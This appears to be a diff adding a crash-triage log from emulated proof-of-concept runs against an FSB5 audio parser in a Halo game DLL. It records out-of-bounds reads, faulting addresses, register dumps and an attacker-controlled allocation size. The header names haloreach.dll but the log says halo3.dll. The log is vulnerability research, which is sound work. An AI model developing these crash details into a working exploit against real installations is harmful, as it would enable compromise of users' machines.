@@ -1,0 +1,88 @@
+# haloreach.dll dynamic FSB5 crash (real Reach binary, from-scratch Unicorn)
+# haloreach.dll sha1 706181dd768c9aed35ffe230e3ec8c31ab4b0cc4 ; 2026-10-21T06:50:41Z
+# open callback 0x602ac0 ; builder 0x6027d0 ; OOB read 0x6028d8
+
+===== poc_v2_numsamples_oob =====
+[*] mapped halo3.dll @ 0x180000000 (size 0x4eda000)
+[*] driving FSB open halo3+0x602ac0 on 68-byte file (mode_arg=0x0)
+[*] instructions executed: 278
+[!] ATTACKER-CONTROLLED ALLOCATION SIZE: 0xfffffffc (memalloc(0xfffffffc))
+[*] call path (tail): 0x584970 stub 0x602650 stub 0x57b1e0 stub 0x10ce0 stub 0x6027d0 0x57b1e0 stub 0x584970 stub 0x57b1e0 stub
+
+########################## FAULT ##########################
+  type        : read-unmapped
+  fault addr  : 0x0000000300003000
+  vs alloc    : memalloc(0x8) @0x300002ff0 (intended size 0x8, mapped 0x10)
+  OOB distance: 0x10 past object base
+  faulting RIP: 0x00000001806028d8  (halo3+0x6028d8)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x00000001806028d8 (halo3+0x6028d8)
+  rsp = 0x00000007f01ff638
+  rbp = 0x00000007f01ff778
+  rax = 0x0000000000000010
+  rbx = 0x0000000200020000
+  rcx = 0x0000000180c12c50 (halo3+0xc12c50)
+  rdx = 0x00000000fffffffc
+  rsi = 0x0000000300004008
+  rdi = 0x0000000000000002
+  r8  = 0x0000000180a797a0 (halo3+0xa797a0)
+  r9  = 0x000000000000016c
+  r10 = 0x0000000300003000
+  r11 = 0x0000000000000000
+  r12 = 0x0000000000000008   <= input@0xc (8-byte LE)
+  r13 = 0x0000000000000010
+  r14 = 0x0000000300002ff0
+  r15 = 0x0000000000000018
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000000000000
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000300004000
+    [rsp+0x38] = 0x0000000300000ff0
+
+===== poc_v3_type6_bigsize =====
+[*] mapped halo3.dll @ 0x180000000 (size 0x4eda000)
+[*] driving FSB open halo3+0x602ac0 on 104-byte file (mode_arg=0x0)
+[*] instructions executed: 343
+[*] call path (tail): 0x584970 stub 0x602650 stub 0x57b1e0 stub 0x10ce0 stub 0x6027d0 0x57b1e0 stub 0x584970 stub 0x57b1e0 stub
+
+########################## FAULT ##########################
+  type        : read-unmapped
+  fault addr  : 0x0000000300003000
+  vs alloc    : memalloc(0x2c) @0x300002fd0 (intended size 0x2c, mapped 0x30)
+  OOB distance: 0x30 past object base
+  faulting RIP: 0x00000001806029b0  (halo3+0x6029b0)
+
+==================== REGISTER STATE AT FAULT ====================
+  rip = 0x00000001806029b0 (halo3+0x6029b0)
+  rsp = 0x00000007f01ff638
+  rbp = 0x00000007f01ff778
+  rax = 0x0000000000000003
+  rbx = 0x000000000dffff00
+  rcx = 0x00000000003fffff
+  rdx = 0x0000000000000008
+  rsi = 0x0000000300004ff0
+  rdi = 0x0000000000000000
+  r8  = 0x0000000000000008
+  r9  = 0x00000000003ffffc
+  r10 = 0x0000000300002fdc
+  r11 = 0x0000000000ffffff
+  r12 = 0x0000000000000008
+  r13 = 0x0000000000000010
+  r14 = 0x0000000300002fd0
+  r15 = 0x0000000000000018
+
+  stack @ rsp:
+    [rsp+0x00] = 0x0000000000000000
+    [rsp+0x08] = 0x0000000000000000
+    [rsp+0x10] = 0x0000000000000000
+    [rsp+0x18] = 0x0000000000000000
+    [rsp+0x20] = 0x0000000000000000
+    [rsp+0x28] = 0x0000000000000000
+    [rsp+0x30] = 0x0000000300004ff0
+    [rsp+0x38] = 0x0000000300000ff0
